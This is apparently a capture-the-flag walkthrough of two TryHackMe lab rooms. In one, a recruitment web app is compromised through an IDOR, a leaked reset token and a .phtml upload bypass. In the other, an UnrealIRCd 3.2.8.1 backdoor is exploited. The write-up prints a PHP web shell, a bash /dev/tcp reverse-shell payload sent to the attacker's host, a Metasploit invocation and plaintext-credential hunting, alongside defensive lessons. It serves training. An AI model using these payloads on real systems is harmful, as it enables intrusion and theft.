---
title: "Path: Guided Pentest Web & Infrastructure"
description: "Two TryHackMe targets in one engagement: RecruitX falls to an IDOR, a reset token printed in the response and a .phtml upload bypass, while a trojaned UnrealIRCd 3.2.8.1 hands over a shell and a plaintext root credential."
difficulty: "Medium"
tags: ["Web Exploitation", "IDOR", "Password Reset", "File Upload", "RCE", "UnrealIRCd", "CVE-2010-2075", "Privilege Escalation"]
date: "2026-05-23"
---

## Overview

This entry covers two targets that belong to the same exercise: the **Penetration Testing Foundations** module of the TryHackMe *Jr Penetration Tester* path. Both were worked on the same day, which is why they share a folder (`path`) and a post.

They are deliberately different in character. The first, a recruitment portal called **RecruitX**, has no memory-corruption bug and no exotic service — it has four ordinary web findings that only become dangerous when they are lined up in the right order. The second is a single host running **UnrealIRCd 3.2.8.1**, the release whose distribution tarball was backdoored in 2010, and it demonstrates how a known-bad version plus a plaintext credential file reduces a whole engagement to two commands.

The useful lessons are therefore not "here is how to run an exploit" but "here is how four low-severity findings become remote code execution", and "fingerprint the exact version before choosing an exploit".

## Room Information

- **Platform:** TryHackMe
- **Rooms:** Guided Pentest: Web (RecruitX) · Guided Pentest: Infrastructure
- **Difficulty:** Medium
- **Operating System:** Ubuntu 24.04 (OpenSSH 9.6p1, Apache 2.4.58)
- **Skills Learned:** Content discovery, IDOR, broken password-reset design, client-side-only upload validation, extension blocklist bypass, UnrealIRCd backdoor exploitation, credential harvesting and reuse across services

## Target A — RecruitX (10.48.187.153)

### Enumeration

```bash
nmap -sV -sC -oN nmap.txt 10.48.187.153
```

```text
# Nmap 7.98 scan initiated Sat May 23 12:22:23 2026 as: /usr/lib/nmap/nmap -sV -sC -oN nmap.txt 10.48.187.153
Nmap scan report for 10.48.187.153
Host is up (0.041s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4e:c1:3e:a3:ff:f1:3f:01:79:55:3a:30:fa:8f:d1:61 (ECDSA)
|_  256 77:68:a0:f9:0c:75:f3:ae:d3:29:33:e6:83:83:6a:c7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: RecruitX - Home
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Service detection against RecruitX, plus HTTP checks on the discovered pages](/assets/screenshots/path/01-recon.png)

Four ports, and three of them are findings before anything is even attacked:

| Port | Service | Observation |
|------|---------|-------------|
| 22/tcp | SSH | No credentials yet — not an entry point |
| 80/tcp | Apache 2.4.58 | The RecruitX PHP application |
| 3306/tcp | MySQL | Reachable from the same network as the web server ("unauthorized" = authentication required) |
| 8080/tcp | Apache 2.4.58 | Stock "It works!" page, presumably a second vhost |

The `http-cookie-flags` result is worth noting on its own: the session cookie is issued **without `HttpOnly`**, so any JavaScript injection in the application would be able to read the session token. Nothing in this chain needs it, but it belongs in a report.

Content discovery maps the application:

```bash
gobuster dir -u http://10.48.187.153/ -w /usr/share/wordlists/dirb/common.txt
```

| Path | Status | Purpose |
|------|--------|---------|
| `/login.php`, `/register.php` | 200 | Authentication |
| `/dashboard.php` | 302 | Authenticated area |
| `/jobs.php` | 200 | Job listings |
| `/reset.php` | 200 | Password reset |
| `/admin/`, `/admin/upload.php` | 301/200 | Administration and file upload |
| `/uploads/`, `/uploads/documents/` | 301 | Uploaded files, with directory listing |
| `/includes/`, `/config/` | 301 | Application internals, also listable |
| `/flag.txt` | 200 | Present in the web root, 35 bytes |
| `/test` | 200 | A raw Apache `VirtualHost` block served as text |

Two of these deserve emphasis. `/test` leaks the server configuration, including `DocumentRoot /var/www/recruitx` and `Options +Indexes` — the latter explains why `/config/` and `/uploads/` happily list their contents. And `/flag.txt` is readable in the web root before any exploitation happens, which is a finding by itself even though it makes the final step of the chain look trivial.

> **On the database:** the notes for this box recorded MySQL as a credential source. The scan shows the service reachable but demanding authentication, and nothing in the chain described below requires it, so it is recorded here as an exposed service rather than an exploited one — the credential-extraction claim could not be reproduced from the artifacts kept in this folder.

### Finding 1 — IDOR on the profile page

Registering an ordinary account leads to a profile at `profile.php?id=7`. That `id` is a raw database key with no ownership check behind it, which means the entire user table can be walked by counting down:

```bash
for i in $(seq 1 6); do
  curl -s -b cookies.txt "http://10.48.187.153/profile.php?id=$i" | grep -E "name|role|email"
done
```

![Enumerating profile.php?id=1 through id=5 to dump the user table](/assets/screenshots/path/02-idor-users.png)

```text
id=1  Sarah Mitchell   s.mitchell@recruitx.thm   administrator
id=2  James Crawford   j.crawford@recruitx.thm   hiring_manager
id=3  Priya Desai      p.desai@recruitx.thm      hiring_manager
id=4  Tom Beckett      t.beckett@recruitx.thm    candidate
id=5  Amina Yusuf      a.yusuf@recruitx.thm      candidate
```

The site renders the role twice — once as a human-readable badge ("Hiring Manager") and once as the raw slug (`hiring_manager`) inside a CSS class. The administrator is **Sarah Mitchell**.

An IDOR that only exposes names and emails is usually filed as a low or medium finding. That classification would be wrong here, because of what it enables next.

### Finding 2 — The reset token is returned to the caller

The password reset page asks for an email address and nothing else. Submitting the administrator's address does not send an email — it returns the token in the HTTP response body:

```bash
curl -s -X POST -d "email=s.mitchell@recruitx.thm" http://10.48.187.153/reset.php
```

```html
Reset Token
432661
/reset.php?token=432661&email=s.mitchell%40recruitx.thm
```

![Requesting a reset for the administrator account returns a six-digit token and a ready-made reset link](/assets/screenshots/path/03-reset-token-leak.png)

Three separate mistakes are visible in that response:

1. **The token is disclosed to whoever requests it**, so possession of the token proves nothing at all.
2. **The token is only six digits.** Even without the response leak, a million possibilities with no rate limiting is a short brute-force.
3. **A ready-made reset link is generated**, which removes the last bit of friction.

Completing the reset with that token and logging in returns an **Administrator** dashboard:

```bash
curl -s -c admin.txt -X POST \
  -d "token=432661&email=s.mitchell@recruitx.thm&new_password=NewPass123&confirm_password=NewPass123" \
  http://10.48.187.153/reset.php

curl -s -b admin.txt http://10.48.187.153/dashboard.php | grep -i admin
```

This is the point where the chaining matters. The reset flaw alone requires knowing an administrator's email address; the IDOR from the previous step is precisely what supplies it. Neither finding is critical in isolation, and together they hand over the highest-privileged account in the application.

### Finding 3 — Client-side upload validation, server-side blocklist

With an administrator session, `/admin/upload.php` becomes reachable. The form restricts what the file picker shows:

```html
<form action="/admin/upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="document" accept=".pdf,.docx,.jpg,.png" required>
</form>
```

The `accept` attribute is a convenience for the browser's file dialog. It filters the list of files a person can see, and it is not a security control — `curl` never renders a file picker, so anything can be submitted regardless.

The server does validate, but against a **blocklist**. Testing the same shell under four extensions shows exactly where that list stops:

| Extension | Uploaded? | Executed? |
|-----------|-----------|-----------|
| `.php` | No — rejected | — |
| `.phtml` | Yes | **Yes** — `uid=33(www-data)` |
| `.php5` | Yes | No — served as plain text |
| `.phar` | Yes | **Yes** — `uid=33(www-data)` |

![Four-extension upload comparison: .php blocked, .phtml and .phar execute, .php5 is served as inert text, followed by hostname and flag retrieval](/assets/screenshots/path/04-upload-bypass-rce.png)

That table is more instructive than the answer alone. Three extensions defeated the filter, but only two are mapped to the PHP handler in this Apache configuration. `.php5` proves that **bypassing validation and achieving execution are two different wins** — a shell that uploads successfully but returns its own source code is not a vulnerability with impact.

A first, harmless upload (`test.txt`, containing "This is a test file") confirmed the endpoint accepted files and where they landed before anything executable was sent.

The shell kept from this box is the smallest possible:

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Saved as `shell.phtml` and uploaded through the admin form, then triggered over HTTP:

```bash
curl -s -F "document=@shell.phtml" -b admin.txt http://10.48.187.153/admin/upload.php
curl -s "http://10.48.187.153/uploads/documents/shell.phtml?cmd=id"
```

```text
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

### RCE on RecruitX

```bash
curl -s "http://10.48.187.153/uploads/documents/shell.phtml?cmd=hostname"
```

```text
recruitx-prod
```

The flag sits in the application root, which is also world-readable over HTTP:

```bash
curl -s "http://10.48.187.153/uploads/documents/shell.phtml?cmd=cat+/var/www/recruitx/flag.txt"
```

```text
THM{ch41n3d_vulns_4r3_d3v4st4t1ng}
```

The theme of the room is spelled out in the flag itself: chained vulnerabilities are devastating.

## Target B — UnrealIRCd (10.48.140.50)

### Enumeration

The second target is a separate host, so it needed its own scan:

```bash
nmap -sV -sC -oN scan.txt 10.48.140.50
```

```text
# Nmap 7.98 scan initiated Sat May 23 22:53:44 2026 as: /usr/lib/nmap/nmap -sV -sC -oN scan.txt 10.48.140.50
Nmap scan report for 10.48.140.50
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:53:7f:39:93:33:e3:58:41:7b:17:63:1b:fc:5e:a8 (ECDSA)
|_  256 4c:3c:4e:cc:e6:ed:0e:fe:80:23:d5:a7:9b:f4:77:00 (ED25519)
6667/tcp open  irc     UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.pentest-target.thm
|   version: Unreal3.2.8.1. irc.pentest-target.thm
|   uptime: 0 days, 0:05:08
|   source ident: nmap
|   source host: ip-192-168-253-107.ap-south-1.compute.internal
|_  error: Closing Link: qqdawagcy[ip-192-168-253-107.ap-south-1.compute.internal] (Quit: qqdawagcy)
Service Info: Host: irc.pentest-target.thm; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![IRC enumeration: port 6667 answers with Unreal3.2.8.1, and searchsploit lists the matching exploits](/assets/screenshots/path/05-irc-enum.png)

Two ports, and the interesting one is 6667 — the standard IRC port. The `irc-info` script did the version fingerprinting for us and returned **Unreal3.2.8.1**, along with the server name `irc.pentest-target.thm`. That version string is the whole engagement in one line.

If the script had not helped, the server can be asked directly. Registering a throwaway nickname and sending `VERSION` over a raw socket produces the same answer:

```bash
{ printf 'NICK aud\r\nUSER aud 0 * :aud\r\n'; sleep 5; printf 'VERSION\r\n'; sleep 3; } \
  | nc -w 10 10.48.140.50 6667 | grep -i version
```

```text
:irc.pentest-target.thm 002 aud :Your host is irc.pentest-target.thm, running version Unreal3.2.8.1
```

### Vulnerability Analysis — CVE-2010-2075

UnrealIRCd's 3.2.8.1 release archive was replaced with a trojaned copy in November 2009 and remained compromised until it was discovered in June 2010. The modification is almost insultingly simple: any IRC message beginning with the two characters `AB` is passed to `system()` and executed as the daemon's user.

Searching for the version confirms two public exploits exist:

```bash
searchsploit unrealircd 3.2.8.1
```

```text
UnrealIRCd 3.2.8.1 - Backdoor Command Execution   | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute    | linux/remote/13853.pl
```

`16922.rb` is the Metasploit module; `13853.pl` is the standalone Perl script. The Perl version is worth reading rather than running, because its payloads download from URLs that have been dead for more than a decade — it *describes* the vulnerability but no longer works. The mechanism it reveals is the only part that matters:

```perl
my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/.../bindshell ...';
```

Everything after `AB;` is simply a shell command. Replacing the stale payload with a reverse shell of your own is far more reliable than trying to revive a 2010 download link.

### Initial Access

Via Metasploit, using the module the scan pointed at:

```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.48.140.50
set LHOST 10.48.187.153
run
```

Or manually, which is faster and shows exactly what the exploit does. Start a listener, then send the `AB;` line over a raw socket:

```bash
nc -lvnp 4446
```

```python
import socket, time
s = socket.create_connection(("10.48.140.50", 6667))
time.sleep(3)
s.sendall(b"AB; bash -c 'bash -i >& /dev/tcp/10.48.187.153/4446 0>&1' \r\n")
time.sleep(5)
```

![The backdoor returns a shell as webmaster, with uid=1001 and the user flag](/assets/screenshots/path/06-irc-revshell.png)

```text
connect to [10.48.187.153] from (UNKNOWN) [10.48.140.50] 50122
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
webmaster@pentest-target:/opt/Unreal3.2$ id
uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)
```

The daemon runs as **webmaster**, not root — which is the reason a second step is needed. The user flag is in that account's home directory:

```bash
cat ~/flag.txt
```

```text
THM{Pwned-Y0ur-First-Machine}
```

The `no job control` warning is normal for a raw netcat catch and does not prevent `cat`, `find`, or reading files. It only becomes a problem for interactive tools, which matters in the next step.

### Post Exploitation — Looted Credentials

Standard enumeration on this Ubuntu 24.04 host came up empty: the SUID set is the stock one, there is no writable cron job, and `sudo -n -l` requires a password. The intended path is a plaintext credential stored where a low-privileged service account can read it:

```bash
find / -name 'password*' 2>/dev/null
cat /etc/password.txt
```

![A plaintext root credential was readable by the IRC daemon's user; SSH then returns a root shell and the root flag](/assets/screenshots/path/07-root-flag.png)

```text
/etc/password.txt
root:<redacted>
```

Because the reverse shell has no TTY, `su` cannot prompt for the password interactively — which is a usability complaint, not a security barrier. SSH is listening on port 22, so the credential is simply reused there, and the two findings together produce full compromise:

```bash
ssh root@10.48.140.50
```

```text
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
THM{Escalat1on-D0ne}
```

This is the better lesson from the box: a credential's value is not limited to the service where it was found. A file readable by an IRC daemon is a root login on SSH.

## Why the Chaining Matters

Read individually, RecruitX's findings look manageable:

| Finding | On its own |
|---|---|
| IDOR on `profile.php` | Leaks names, emails, roles — low impact |
| Reset token returned in the response | Critical, but needs a target email address |
| Client-side `accept` + blocklist upload filter | Only matters once an admin session exists |
| `/test` config file and `/flag.txt` in the web root | Information disclosure |

The reset flaw cannot be reached without the administrator's email, which only the IDOR provides. The upload bypass cannot be reached without an administrator session, which only the reset flaw provides. Ordering them by what each one **unlocks**, rather than by its severity score, is what makes the report actionable — a client who patches only the "Critical" row still has a path to RCE through the two findings rated below it.

The same logic applies on the infrastructure side: the IRC backdoor is a decade-old, well-documented bug, and the credential file turns it from "shell as a service account" into "root".

## Flags

TryHackMe may rotate these values; the locations are what matter.

| Target | Flag | Location |
|--------|------|----------|
| RecruitX | `THM{ch41n3d_vulns_4r3_d3v4st4t1ng}` | `/var/www/recruitx/flag.txt` |
| IRC host | `THM{Pwned-Y0ur-First-Machine}` | `/home/webmaster/flag.txt` |
| IRC host | `THM{Escalat1on-D0ne}` | `/root/root.txt` |

## Commands Used

```bash
# --- Target A: RecruitX ---
nmap -sV -sC -oN nmap.txt 10.48.187.153
gobuster dir -u http://10.48.187.153/ -w /usr/share/wordlists/dirb/common.txt
curl -s http://10.48.187.153/test              # leaked vhost config / DocumentRoot

# IDOR
for i in $(seq 1 6); do curl -s -b cookies.txt \
  "http://10.48.187.153/profile.php?id=$i" | grep -E "name|role|email"; done

# Password reset token disclosure
curl -s -X POST -d "email=s.mitchell@recruitx.thm" http://10.48.187.153/reset.php
curl -s -c admin.txt -X POST \
  -d "token=432661&email=s.mitchell@recruitx.thm&new_password=NewPass123&confirm_password=NewPass123" \
  http://10.48.187.153/reset.php

# Upload bypass and RCE
curl -s -F "document=@test.txt"    -b admin.txt http://10.48.187.153/admin/upload.php
curl -s -F "document=@shell.phtml" -b admin.txt http://10.48.187.153/admin/upload.php
curl -s "http://10.48.187.153/uploads/documents/shell.phtml?cmd=id"
curl -s "http://10.48.187.153/uploads/documents/shell.phtml?cmd=cat+/var/www/recruitx/flag.txt"

# --- Target B: UnrealIRCd ---
nmap -sV -sC -oN scan.txt 10.48.140.50
{ printf 'NICK aud\r\nUSER aud 0 * :aud\r\n'; sleep 5; printf 'VERSION\r\n'; sleep 3; } \
  | nc -w 10 10.48.140.50 6667 | grep -i version
searchsploit unrealircd 3.2.8.1

# Backdoor (Metasploit)
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; \
  set RHOSTS 10.48.140.50; set LHOST 10.48.187.153; run"

# Backdoor (manual, over the raw socket)
python3 -c 'import socket,time; s=socket.create_connection(("10.48.140.50",6667)); time.sleep(3); s.sendall(b"AB; bash -c \"bash -i >& /dev/tcp/10.48.187.153/4446 0>&1\"\r\n"); time.sleep(5)'

# Post exploitation
cat ~/flag.txt
find / -name 'password*' 2>/dev/null
cat /etc/password.txt
ssh root@10.48.140.50
cat /root/root.txt
```

## Lessons Learned

- **Severity scores do not describe chains.** The IDOR that leaked an email address was rated lower than the reset flaw it made exploitable. Patching findings one row at a time is how an application keeps a route to RCE after a "critical" fix.
- **A reset token returned in the response is not a token.** Its purpose is to prove control of an email inbox. Printing it to the requester, alongside a pre-built reset link, removes the only property that made it a control.
- **Token length is a secondary problem.** Six digits is a million-value keyspace with no rate limiting, which is already weak — but it never mattered, because the value was handed over directly.
- **`accept` is not validation.** It filters a file dialog in the browser. Anything that does not render a file picker ignores it completely, so extension and MIME checks must exist on the server and must never be the only control.
- **Blocklists rot; allowlists do not.** The filter correctly blocked `.php` and missed `.phtml` and `.phar`, simply because PHP has a long tail of handler-mapped extensions and a blocklist has to name every one of them forever. An allowlist of `pdf, docx, jpg, png` cannot rot.
- **Uploading is not the same as executing.** `.php5` passed the filter and produced nothing. In a report, "the filter was bypassed" with no successful execution is informational; "the filter was bypassed and code ran" is critical. Test each candidate extension by requesting it, not by trusting the upload response.
- **Fingerprint the exact version, not the service.** nmap knew the service was UnrealIRCd but had to be helped to learn it was 3.2.8.1. That single number is the difference between an IRC server and a trojaned build.
- **Read old exploits before running them.** `13853.pl` is a correct description of CVE-2010-2075 wrapped around payloads that no longer download. Understanding that the vulnerability is nothing more than an `AB;` prefix let me send my own reverse shell instead of debugging dead URLs.
- **A credential found in one place is usually valid in another.** `/etc/password.txt` was only readable because the daemon ran as a service account; the login itself worked on SSH. Treat every discovered credential as a candidate for every service, not just the one where it was found.

## References

- [TryHackMe — Guided Pentest: Web](https://tryhackme.com/room/guidedpentestweb)
- [TryHackMe — Guided Pentest: Infrastructure](https://tryhackme.com/room/guidedpentestinfrastructure)
- [TryHackMe — Jr Penetration Tester path](https://tryhackme.com/path/outline/jrpenetrationtester)
- [CVE-2010-2075 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)
- [UnrealIRCd 3.2.8.1 backdoor — Metasploit module](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/)
- [OWASP — Insecure Direct Object Reference](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Animesh Roy — Guided Pentest: Web walkthrough](https://classroom.anir0y.in/post/thm-room-guidedpentestweb/)
- [Animesh Roy — Guided Pentest: Infrastructure walkthrough](https://classroom.anir0y.in/post/thm-room-guidedpentestinfrastructure/)

*Screenshots in this post were sourced from the two reference walkthroughs listed above, since no captures were kept in the original room folder.*
